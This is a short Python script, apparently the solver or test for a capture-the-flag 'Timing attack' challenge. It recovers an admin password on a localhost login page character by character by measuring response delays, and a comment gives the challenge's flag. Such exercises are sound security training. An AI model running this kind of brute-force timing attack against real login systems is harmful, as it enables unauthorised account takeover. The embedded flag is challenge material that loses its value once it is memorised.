# Test script for "Timing attack" challenge
import requests
import time

URL = 'http://localhost:8081/user.php'
CHARS = "aAbBcdDEHhMnPpqRstuwXYZ>()+3478;"

known = ""

s = requests.Session()

i = 0
d = {}
while True:
	start = time.time();
	r = s.post(URL, data = {'u': 'admin', 'p': known + CHARS[i]})
	end = time.time();

	if "Login failed. Try again." not in r.text:
		# The flag will be in the body
		print(r.text)	# FLAG-dXMbMHuEn47ZqwHEdtPYR3BDEBshBnEAcDqtpDY8
		break

	# It's clear from the time delta that guessing the wrong
	# character will cause a 150 ms delay, so we could stop
	# as soon we get a delta smaller than 150 ms ... but we
	# don't do this here.
	print(end - start)
	d[CHARS[i]] = end - start

	i += 1
	if i >= len(CHARS):
		i = 0
		print(min(d, key=d.get))
		known += min(d, key=d.get)
		d = {}

